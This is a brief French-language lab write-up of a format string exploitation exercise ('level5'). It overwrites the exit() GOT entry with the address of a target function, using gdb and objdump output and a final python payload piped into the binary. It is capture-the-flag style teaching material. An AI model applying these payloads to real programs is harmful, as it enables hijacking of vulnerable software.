# level5

In printf `eip` is at `0xbffff4fc`
Function `o()` is at `0x080484a4`
Let's put this adress in `EIP`!

```bash
python -c "print '\xfc\xf4\xff\xbf' + '%134513824x' + '%4\$n'")
```

Ne marche pas avec 24, 25, 26 plante au milieu de la fonction `(<o+2>)`

On arrive pas à lancer function `o()` \
`eip` dans `printf` change de temps en temps ---> **le seum**

Sauf que!! On peut réecrire le GOT (Global Offset Table): on réecrie l'adresse de `exit()` et on y met l'adresse de `o()`:
```
(gdb) info function exit
# 0x080483d0  exit

disas 0x080483d0
# Dump of assembler code for function exit@plt:
#   0x080483d0 <+0>:     jmp    DWORD PTR ds:0x8049838
#   0x080483d6 <+6>:     push   0x28
#   0x080483db <+11>:    jmp    0x8048370
# End of assembler dump.
```

=> Deuxième manière d'avoir le GOT:
```
objdump -R ./level5

./level5:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE
08049814 R_386_GLOB_DAT    __gmon_start__
08049848 R_386_COPY        stdin
08049824 R_386_JUMP_SLOT   printf
08049828 R_386_JUMP_SLOT   _exit
0804982c R_386_JUMP_SLOT   fgets
08049830 R_386_JUMP_SLOT   system
08049834 R_386_JUMP_SLOT   __gmon_start__
08049838 R_386_JUMP_SLOT   exit # <---
0804983c R_386_JUMP_SLOT   __libc_start_main
```

On a notre payload:
```bash
(python -c "print '\x38\x98\x04\x08' + '%134513824x' + '' + '%4\$n'"; cat) | ./level5
```
